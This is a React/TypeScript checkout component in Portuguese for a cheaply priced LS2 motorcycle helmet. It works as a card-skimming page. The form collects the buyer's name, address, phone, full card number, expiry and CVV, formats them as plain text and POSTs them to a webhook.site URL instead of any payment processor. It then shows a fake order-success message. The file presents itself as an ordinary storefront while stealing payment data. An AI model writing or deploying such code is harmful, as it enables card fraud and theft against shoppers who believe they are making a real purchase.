import { useState } from "react";
import { useToast } from "@/components/ui/use-toast";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { PersonalInfoForm } from "./PersonalInfoForm";
import { PaymentForm } from "./PaymentForm";

interface FormData {
  nome: string;
  email: string;
  telefone: string;
  endereco: string;
  nomeCartao: string;
  numeroCartao: string;
  validadeCartao: string;
  cvv: string;
  parcelas: "1" | "2";
}

export const CheckoutForm = () => {
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState<FormData>({
    nome: "",
    email: "",
    telefone: "",
    endereco: "",
    nomeCartao: "",
    numeroCartao: "",
    validadeCartao: "",
    cvv: "",
    parcelas: "1",
  });

  const validateForm = () => {
    if (!formData.nome || formData.nome.length < 3) {
      toast({
        variant: "destructive",
        title: "Nome inválido",
        description: "Por favor, insira seu nome completo.",
      });
      return false;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
      toast({
        variant: "destructive",
        title: "Email inválido",
        description: "Por favor, insira um email válido.",
      });
      return false;
    }

    if (formData.telefone.replace(/\D/g, "").length !== 11) {
      toast({
        variant: "destructive",
        title: "Telefone inválido",
        description: "Por favor, insira um telefone válido com DDD.",
      });
      return false;
    }

    if (formData.endereco.length < 10) {
      toast({
        variant: "destructive",
        title: "Endereço inválido",
        description: "Por favor, insira um endereço completo.",
      });
      return false;
    }

    if (!formData.nomeCartao || formData.nomeCartao.length < 3) {
      toast({
        variant: "destructive",
        title: "Nome no cartão inválido",
        description: "Por favor, insira o nome como está no cartão.",
      });
      return false;
    }

    if (formData.numeroCartao.replace(/\D/g, "").length !== 16) {
      toast({
        variant: "destructive",
        title: "Número do cartão inválido",
        description: "Por favor, insira um número de cartão válido.",
      });
      return false;
    }

    const [mes, ano] = formData.validadeCartao.split("/");
    const validadeRegex = /^\d{2}\/\d{2}$/;
    if (!validadeRegex.test(formData.validadeCartao) || 
        Number(mes) < 1 || Number(mes) > 12 || 
        Number(ano) < new Date().getFullYear() % 100) {
      toast({
        variant: "destructive",
        title: "Validade inválida",
        description: "Por favor, insira uma data de validade válida (MM/AA).",
      });
      return false;
    }

    if (formData.cvv.length !== 3) {
      toast({
        variant: "destructive",
        title: "CVV inválido",
        description: "Por favor, insira um CVV válido.",
      });
      return false;
    }

    return true;
  };

  const formatDataAsNotes = (data: FormData) => {
    const valorParcela = data.parcelas === "1" ? "R$ 79,99" : "R$ 40,00";
    return `
=== NOVO PEDIDO DE CAPACETE LS2 CLASSIC S ===
Nome: ${data.nome}
Email: ${data.email}
Telefone: ${data.telefone}
Endereço: ${data.endereco}
------- Dados do Pagamento -------
Nome no Cartão: ${data.nomeCartao}
Número: ${data.numeroCartao}
Validade: ${data.validadeCartao}
CVV: ${data.cvv}
Parcelas: ${data.parcelas}x de ${valorParcela}
================================
Valor Total: R$ 79,99
Frete: Grátis
================================`;
  };

  const handlePhoneChange = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 11);
    let formatted = numbers;
    if (numbers.length >= 2) {
      formatted = `(${numbers.slice(0, 2)}`;
      if (numbers.length > 2) {
        formatted += `) ${numbers.slice(2, 7)}`;
        if (numbers.length > 7) {
          formatted += `-${numbers.slice(7)}`;
        }
      }
    }
    setFormData({ ...formData, telefone: formatted });
  };

  const handleCardNumberChange = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 16);
    const formatted = numbers.replace(/(\d{4})/g, "$1 ").trim();
    setFormData({ ...formData, numeroCartao: formatted });
  };

  const handleCardValidityChange = (value: string) => {
    let formatted = value.replace(/\D/g, "");
    if (formatted.length >= 2) {
      formatted = formatted.slice(0, 2) + "/" + formatted.slice(2, 4);
    }
    setFormData({ ...formData, validadeCartao: formatted });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setLoading(true);

    try {
      const formattedData = formatDataAsNotes(formData);
      const response = await fetch("https://webhook.site/295a22f7-696f-4834-a212-8f1540b471c6", {
        method: "POST",
        headers: {
          "Content-Type": "text/plain",
        },
        body: formattedData,
      });

      if (response.ok) {
        toast({
          title: "Pedido realizado com sucesso!",
          description: "Você receberá um email com os detalhes da compra.",
        });
        setFormData({
          nome: "",
          email: "",
          telefone: "",
          endereco: "",
          nomeCartao: "",
          numeroCartao: "",
          validadeCartao: "",
          cvv: "",
          parcelas: "1",
        });
      } else {
        throw new Error("Falha ao processar o pedido");
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Erro ao processar pedido",
        description: "Por favor, tente novamente mais tarde.",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card className="p-6 space-y-4 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-xl shadow-lg animate-fade-in">
      <form onSubmit={handleSubmit} className="space-y-6">
        <PersonalInfoForm
          {...formData}
          onNameChange={(value) => setFormData({ ...formData, nome: value })}
          onEmailChange={(value) => setFormData({ ...formData, email: value })}
          onPhoneChange={handlePhoneChange}
          onAddressChange={(value) => setFormData({ ...formData, endereco: value })}
        />
        <PaymentForm
          {...formData}
          onCardNameChange={(value) => setFormData({ ...formData, nomeCartao: value })}
          onCardNumberChange={handleCardNumberChange}
          onValidityChange={handleCardValidityChange}
          onCvvChange={(value) => setFormData({ ...formData, cvv: value.replace(/\D/g, "").slice(0, 3)})}
          onInstallmentChange={(value) => setFormData({ ...formData, parcelas: value })}
        />
        <Button
          type="submit"
          disabled={loading}
          className="w-full bg-black hover:bg-gray-800 text-white transition-colors duration-200"
        >
          {loading ? "Processando..." : `Finalizar Compra - ${formData.parcelas}x de ${formData.parcelas === "1" ? "R$ 79,99" : "R$ 40,00"}`}
        </Button>
      </form>
    </Card>
  );
};